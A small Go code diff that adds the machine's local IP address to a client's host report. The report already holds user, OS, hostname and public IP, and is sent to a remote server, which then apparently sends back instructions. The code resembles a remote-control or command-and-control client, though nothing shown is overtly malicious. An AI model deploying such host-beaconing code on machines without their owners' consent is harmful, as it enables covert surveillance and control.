@@ -22,6 +22,7 @@ type Client struct {
 	OperatingSystem string
 	Hostname        string
 	PublicIP        string
+	LocalIP         string
 }
 
 type Instructions struct {
@@ -58,7 +59,8 @@ func start() error {
 		return e
 	}
 	defer conn.Close()
-	if err := sendOSInfo(conn); err != nil {
+	localIP := fmt.Sprint(conn.LocalAddr().(*net.TCPAddr).IP)
+	if err := sendOSInfo(conn, localIP); err != nil {
 		return err
 	}
 	for {
@@ -84,7 +86,7 @@ func getIP() (string, error) {
 	return ip, nil
 }
 
-func sendOSInfo(conn net.Conn) error {
+func sendOSInfo(conn net.Conn, localIP string) error {
 	currentUser, err := user.Current()
 	if err != nil {
 		e := fmt.Errorf("Error happened getting user: %v\n", err)
@@ -110,6 +112,7 @@ func sendOSInfo(conn net.Conn) error {
 		OperatingSystem: runtime.GOOS,
 		Hostname:        clientHostname,
 		PublicIP:        ip,
+		LocalIP:         localIP,
 	}
 
 	enc := gob.NewEncoder(conn)
